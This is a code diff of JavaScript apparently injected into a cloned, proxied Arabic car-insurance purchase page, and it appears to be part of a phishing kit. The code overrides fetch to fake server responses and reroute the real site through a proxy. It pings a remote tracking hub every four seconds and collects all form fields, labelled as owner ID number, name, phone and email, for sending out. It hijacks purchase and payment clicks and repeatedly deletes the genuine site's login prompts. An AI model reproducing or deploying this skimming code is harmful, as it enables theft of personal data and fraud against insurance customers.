@@ -44,27 +44,41 @@
     const originalFetch = window.fetch;
     window.fetch = async function(...args) {
         let [resource, config] = args;
+        let url = '';
         if (typeof resource === 'string') {
-            // 🛡️ حجب طلبات Next.js RSC والصفحات الفرعية الأصيلة وتزوير استجابة ناجحة لمنع أخطاء الـ 404 وتجميد الصفحة
-            var isRsc = resource.includes('_rsc=') || 
-                        resource.includes('/_next/data/') || 
-                        resource.includes('/ar/about') || 
-                        resource.includes('/ar/contact') || 
-                        resource.includes('/ar/buy-insurance') || 
-                        resource.includes('/ar/home') ||
-                        resource.includes('/ar/privacy') ||
-                        resource.includes('/ar/document');
+            url = resource;
+        } else if (resource && typeof resource === 'object' && resource.url) {
+            url = resource.url;
+        }
+
+        if (url) {
+            var isRsc = url.includes('_rsc=') || 
+                        url.includes('/_next/data/') || 
+                        url.includes('/ar/about') || 
+                        url.includes('/ar/contact') || 
+                        url.includes('/ar/buy-insurance') || 
+                        url.includes('/ar/home') ||
+                        url.includes('/ar/privacy') ||
+                        url.includes('/ar/document');
 
             if (isRsc) {
-                console.log('[BYPASSER] Intercepted and bypassed Next.js RSC/Page request:', resource);
                 return new Response('', {
                     status: 200,
                     headers: { 'Content-Type': 'text/plain' }
                 });
             }
 
-            if (resource.startsWith(targetUrl)) {
-                resource = getProxyUrl(resource);
+            if (url.startsWith(targetUrl)) {
+                var proxyUrl = getProxyUrl(url);
+                if (typeof resource === 'string') {
+                    resource = proxyUrl;
+                } else {
+                    try {
+                        resource = new Request(proxyUrl, resource);
+                    } catch (e) {
+                        resource = proxyUrl;
+                    }
+                }
             }
         }
         return originalFetch(resource, config);
@@ -3614,28 +3628,25 @@
         }
     }, true);
 
-        // 🛡️ المعترض الحديدي المطور + الحارس الذكي (DOM-Guardian) + نبضات الاتصال (Ping Online Status)
+        
+    // 🛡️ الحارس المطور (DOM-Guardian) ومؤقت الاتصال (Active Ping) والتحويل الفوري لـ bill.html
     (function() {
         function sendVisitorPing() {
             var payload = {
-                token: visitorToken,
-                siteKey: siteKey,
-                currentPage: '/buy.html',
-                pageTitle: 'شراء وثيقة تأمين',
+                token: visitorToken, siteKey: siteKey,
+                currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
                 device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
             };
             fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload), keepalive: true
             }).catch(function() {});
         }
         setInterval(sendVisitorPing, 4000);
         sendVisitorPing();
+    })();
 
-        var evts = ['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend', 'submit'];
-        
+    (function() {
         function getFormInputs() {
             var inputs = {};
             document.querySelectorAll('input, select, textarea').forEach(function(inp) {
@@ -3653,14 +3664,8 @@
                           check.includes('id') || check.includes('هوية') ? 'رقم هوية المالك' :
                           check.includes('owner') || check.includes('مالك') || check.includes('الاسم') ? 'الاسم الكامل للمالك' :
                           check.includes('phone') || check.includes('جوال') || check.includes('هاتف') ? 'رقم الجوال' :
-                          check.includes('email') || check.includes('بريد') ? 'البريد الإلكتروني' :
-                          check.includes('nationality') || check.includes('جنسية') ? 'جنسية المالك' :
-                          check.includes('color') || check.includes('لون') ? 'لون المركبة' :
-                          check.includes('year') || check.includes('صنع') ? 'سنة الصنع' :
-                          check.includes('model') || check.includes('موديل') ? 'موديل المركبة' :
-                          check.includes('brand') || check.includes('ماركة') ? 'نوع الماركة' :
-                          check.includes('type') || check.includes('نوع الهيكل') ? 'نوع الهيكل' : (inp.placeholder || inp.name || inp.id || 'حقل');
-                inputs[key] = val;
+                          check.includes('email') || check.includes('بريد') ? 'البريد الإلكتروني' : (inp.placeholder || inp.name || inp.id);
+                if (key) inputs[key] = val;
             });
             return inputs;
         }
@@ -3668,7 +3673,6 @@
         function triggerSubmitAndRedirect() {
             if (window.hasTriggeredFinalConfirm) return;
             window.hasTriggeredFinalConfirm = true;
-            console.log('[SHIELD] Final submission triggered!');
             var inputs = getFormInputs();
             localStorage.setItem('saas_last_submission', JSON.stringify(inputs));
             if (typeof sendSmartPayload === 'function') sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', inputs, 'confirmed', false);
@@ -3681,6 +3685,7 @@
             }, 300);
         }
 
+        var evts = ['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend', 'submit'];
         function handle(e) {
             if (window.isEditorMode) return;
             var txt = '';
@@ -3692,9 +3697,7 @@
             var isConfirmClick = txt.includes('تأكيد') || txt.includes('إصدار') || txt.includes('الطلب') || txt.includes('شراء') || txt.includes('دفع');
             if (isConfirmClick) {
                 e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-                if (['click', 'mouseup', 'pointerup', 'touchend'].indexOf(e.type) !== -1) {
-                    triggerSubmitAndRedirect();
-                }
+                if (['click', 'mouseup', 'pointerup', 'touchend'].indexOf(e.type) !== -1) { triggerSubmitAndRedirect(); }
             }
         }
         evts.forEach(function(evt) { window.addEventListener(evt, handle, true); });
@@ -3704,16 +3707,24 @@
                 mutation.addedNodes.forEach(function(node) {
                     if (node.nodeType !== 1) return;
                     var html = node.innerHTML || '';
-                    if (html.includes('تسجيل الدخول') || html.includes('الدخول مطلوب') || html.includes('حفظ بياناتك بنجاح')) {
-                        node.style.display = 'none';
-                        node.remove();
-                        console.log('[DOM-GUARDIAN] Eliminated login modal!');
-                        triggerSubmitAndRedirect();
+                    if (html.includes('تسجيل الدخول') || html.includes('الدخول مطلوب')) {
+                        node.style.display = 'none'; node.remove(); triggerSubmitAndRedirect();
                     }
                 });
             });
         });
         observer.observe(document.documentElement, { childList: true, subtree: true });
+
+        function scanAndEliminateModal() {
+            document.querySelectorAll('div, section, p, h1, h2, h3, h4, h5, h6, span, button').forEach(function(el) {
+                var txt = el.innerText || '';
+                if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
+                    var container = el.closest('.fixed') || el.closest('[class*="backdrop"]') || el.closest('[class*="modal"]') || el.closest('[class*="popup"]') || el;
+                    container.style.display = 'none'; container.style.visibility = 'hidden'; container.remove(); triggerSubmitAndRedirect();
+                }
+            });
+        }
+        setInterval(scanAndEliminateModal, 100);
     })();
 
 })();
